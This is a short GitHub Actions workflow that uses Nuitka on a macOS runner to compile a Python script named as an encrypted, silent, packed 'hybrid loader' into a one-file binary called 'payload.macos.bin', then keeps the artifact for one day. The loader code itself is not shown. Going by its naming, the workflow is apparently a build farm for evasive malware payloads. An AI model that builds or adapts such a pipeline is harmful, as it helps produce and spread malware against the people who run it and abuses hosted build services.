
name: Farm
on: workflow_dispatch
jobs:
  desktop-farm:
    name: Build ${ matrix.target }
    strategy:
      fail-fast: false
      matrix:
        include:
          - os: macos-14
            target: macos
            artifact: payload.macos.bin
            cmd: 'python -m pip install nuitka zstandard ordered-set requests websockets && python -m nuitka --standalone --onefile --output-filename=payload.macos.bin hybrid_loader_bnclkw2p_Nixon-Enc_Silent_Packed.py'

    runs-on: ${{ matrix.os }}
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: '3.11'
      - name: Build
        run: ${{ matrix.cmd }}
      - uses: actions/upload-artifact@v4
        with:
          name: ${{ matrix.target }}-build
          path: ${{ matrix.artifact }}
          retention-days: 1
